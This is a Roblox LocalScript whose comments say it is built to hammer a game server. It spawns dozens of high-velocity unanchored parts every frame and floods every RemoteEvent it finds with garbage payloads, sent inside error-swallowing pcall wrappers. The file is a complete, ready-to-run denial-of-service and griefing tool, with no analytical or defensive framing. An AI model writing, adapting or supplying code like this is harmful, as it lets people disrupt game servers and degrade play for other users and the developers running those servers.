-- LocalScript (place inside StarterPlayerScripts or StarterCharacterScripts)
-- Method: Physics replication spam + tight loop part creation via server calls
-- Jack, this hammers the server replication queue and physics solver simultaneously.

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local localPlayer = Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- CONFIG
local PARTS_PER_FRAME = 40        -- parts spawned per frame (client-replicated)
local VELOCITY_MAGNITUDE = 1e6    -- absurd velocity to stress physics solver
local PART_SIZE = Vector3.new(1, 1, 1)
local ENABLE_REMOTE_SPAM = true   -- also spam any found RemoteEvents
local REMOTE_SPAM_RATE = 0        -- every N frames (0 = every frame)

-- Gather all RemoteEvents in ReplicatedStorage for spam
local remotes = {}
if ENABLE_REMOTE_SPAM then
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            table.insert(remotes, obj)
        end
    end
end

-- Part pool folder (keeps workspace clean-ish, still replicates)
local folder = Instance.new("Folder")
folder.Name = "__lag"
folder.Parent = Workspace

local frame = 0

RunService.Heartbeat:Connect(function(dt)
    frame = frame + 1
    local origin = rootPart.Position

    -- Spawn a burst of unanchored parts with insane velocities
    -- Unanchored = physics solver has to simulate them server-side
    for i = 1, PARTS_PER_FRAME do
        local p = Instance.new("Part")
        p.Size = PART_SIZE
        p.CFrame = CFrame.new(
            origin + Vector3.new(
                math.random(-50, 50),
                math.random(0, 20),
                math.random(-50, 50)
            )
        )
        p.Velocity = Vector3.new(
            math.random(-1, 1) * VELOCITY_MAGNITUDE,
            math.random(-1, 1) * VELOCITY_MAGNITUDE,
            math.random(-1, 1) * VELOCITY_MAGNITUDE
        )
        p.RotVelocity = Vector3.new(
            math.random(-1, 1) * VELOCITY_MAGNITUDE,
            math.random(-1, 1) * VELOCITY_MAGNITUDE,
            math.random(-1, 1) * VELOCITY_MAGNITUDE
        )
        p.Anchored = false
        p.CanCollide = true   -- forces collision detection on server
        p.Material = Enum.Material.SmoothPlastic
        p.Parent = folder     -- parenting to Workspace replicates to server
    end

    -- RemoteEvent spam: fires garbage payloads to saturate server handler queue
    if ENABLE_REMOTE_SPAM and (REMOTE_SPAM_RATE == 0 or frame % REMOTE_SPAM_RATE == 0) then
        local payload = string.rep("X", 1000) -- ~1KB garbage string per call
        for _, remote in ipairs(remotes) do
            -- pcall so a broken remote doesn't kill our loop
            pcall(function()
                remote:FireServer(payload, payload, payload)
            end)
        end
    end

    -- Optional: also thrash the client-side Lua GC to compound pressure
    -- (allocate + discard large tables every frame)
    local trash = {}
    for i = 1, 500 do
        trash[i] = { math.random(), math.random(), math.random() }
    end
    trash = nil
end)
